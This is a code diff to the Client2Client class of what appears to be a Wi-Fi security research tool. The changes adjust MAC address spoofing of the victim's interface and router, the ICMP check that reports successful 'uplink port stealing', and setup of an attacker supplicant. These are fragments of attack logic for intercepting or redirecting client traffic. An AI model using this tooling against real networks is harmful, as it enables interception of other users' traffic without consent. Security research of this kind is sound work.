@@ -749,6 +749,8 @@ class Client2Client:
 	def __init__(self, options):
 		self.options = options
 		self.poc = options.poc
+		if self.options.c2c_port_steal is not None:
+			set_macaddress(self.options.c2c, get_macaddress(self.options.iface))
 		if not self.poc:
 			self.sup_victim = Supplicant(options.iface, options)
 			self.sup_attacker = Supplicant(options.c2c, options)
@@ -808,7 +810,7 @@ class Client2Client:
 			log(STATUS, f">>> Reinjected the frame via broadcast reflection.", color="green")
 
 	def monitor_eth_port_steal_uplink(self, eth):
-		if ICMP in eth and eth[ICMP].type == 0 and eth[Raw].load == b"abcdefghijklmn" :
+		if ICMP in eth and eth[ICMP].type == 8 and eth[Raw].load == b"abcdefghijklmn" :
 			log(STATUS, f">>> Uplink port stealing is successful.", color="red")
 
 	def send_c2c_frame(self):
@@ -942,8 +944,6 @@ class Client2Client:
 
 	def run(self):
 		# Start both clients
-		if self.options.c2c_port_steal is not None:
-			set_macaddress(self.options.c2c, get_macaddress(self.options.iface))
 		if not self.options.poc:
 			self.sup_victim.start()
 		
@@ -965,6 +965,7 @@ class Client2Client:
 
 		if self.options.c2c_port_steal_uplink is not None:
 			set_macaddress(self.options.c2c, self.sup_victim.routermac)
+			self.sup_attacker = Supplicant(self.options.c2c, self.options)
 
 		self.sup_attacker.start()
 		self.sup_attacker.scan(wait=False)
